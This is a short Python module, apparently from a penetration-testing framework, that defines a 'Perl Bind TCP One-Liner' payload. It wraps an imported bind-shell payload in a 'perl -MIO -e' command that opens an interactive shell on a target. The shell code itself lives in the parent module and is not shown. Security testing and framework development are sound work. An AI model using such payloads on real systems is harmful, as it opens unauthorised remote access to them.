from thg.core.exploit import *
from thg.modules.payloads.perl.bind_tcp import Payload as PerlBindTCP


class Payload(PerlBindTCP):
    __info__ = {
        "name": "Perl Bind TCP One-Liner",
        "description": "Creates interactive tcp bind shell by using perl one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # thg module
        ),
    }

    cmd = OptString("perl", "Perl binary")

    def generate(self):
        self.fmt = self.cmd + " -MIO -e \"{}\""
        payload = super(Payload, self).generate()
        return payload
